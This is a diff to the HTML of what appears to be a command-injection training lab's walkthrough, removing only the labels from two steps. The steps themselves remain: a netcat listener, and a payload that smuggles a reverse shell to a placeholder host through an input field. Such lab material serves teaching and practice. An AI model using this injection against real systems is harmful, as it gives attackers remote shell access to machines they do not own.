@@ -53,13 +53,13 @@
                         <li>Step 1:
                             <ul>
                                 Start a nc listener.<br>
-                                command = <code>nc -lvnp 1234</code>
+                                <code>nc -lvnp 1234</code>
                             </ul>
                         </li>
                         <li>Step 2:
                             <ul>
                                 Enter your reverse shell command in the input field with command injection vulnerability and click on <code>Convert</code> button.<br>
-                                payload = <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>
+                                <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>
                                 You got a reverse shell.
                             </ul>
                         </li>
